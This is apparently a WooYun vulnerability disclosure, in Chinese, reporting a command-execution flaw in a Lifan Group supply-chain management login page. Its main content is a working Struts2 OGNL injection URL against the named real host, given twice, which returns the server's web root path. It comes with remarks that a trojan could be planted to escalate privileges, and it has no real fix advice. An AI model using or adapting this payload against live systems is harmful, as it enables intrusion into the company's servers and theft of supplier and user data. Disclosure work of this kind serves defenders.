wybug_title: 力帆集团某站管理系统命令执行漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-07-25：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-09-08：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 地址：http://autoscm.lifan.com/login.action这里信息比较敏感，一些供应商，用户的数据容易泄露。 详细说明：  http://autoscm.lifan.com/login.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D网站路径：C:\SCMproject\PROJECT\GeneSCM\ 

漏洞测试，可以直接写入木马提权哦。

windows 2008的服务器，权限很大啊。



   漏洞证明：  http://autoscm.lifan.com/login.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D网站路径：C:\SCMproject\PROJECT\GeneSCM\ 

漏洞测试，可以直接写入木马提权哦。

windows 2008的服务器，权限很大啊。



   修复方案：  别脱裤啊,伤不起。   版权声明：转载请注明来源 Mxxz@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
